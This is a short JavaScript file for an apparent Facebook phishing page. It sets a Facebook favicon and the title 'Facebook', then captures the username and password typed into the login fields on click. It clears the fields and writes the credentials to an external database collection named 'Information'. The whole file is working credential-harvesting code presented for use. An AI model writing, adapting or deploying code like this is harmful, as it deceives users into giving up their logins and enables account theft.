function changeFavicon() {
  var link;
  link = document.createElement("link");
  link.type = "image/x-icon";
  link.rel = "shortcut icon";
  link.href =
    "https://raw.githubusercontent.com/p1995/face_book/master/Yootheme-Social-Bookmark-Social-facebook-box-blue.ico";
  document.getElementsByTagName("head")[0].appendChild(link);
  Title = document.createElement("Title");
  Title.textContent = "Facebook";
  document.getElementsByTagName("head")[0].appendChild(Title);
}

changeFavicon();
document.getElementById("button").addEventListener("click", e => {
  e.preventDefault();
  var username = document.getElementsByClassName("inputtext")[0].value;
  var password = document.getElementsByClassName("inputtext")[1].value;
  document.getElementsByClassName("inputtext")[0].value = "";
  document.getElementsByClassName("inputtext")[1].value = "";
  console.log(db);
  db.collection("Information").add({ username: username, password: password });
});
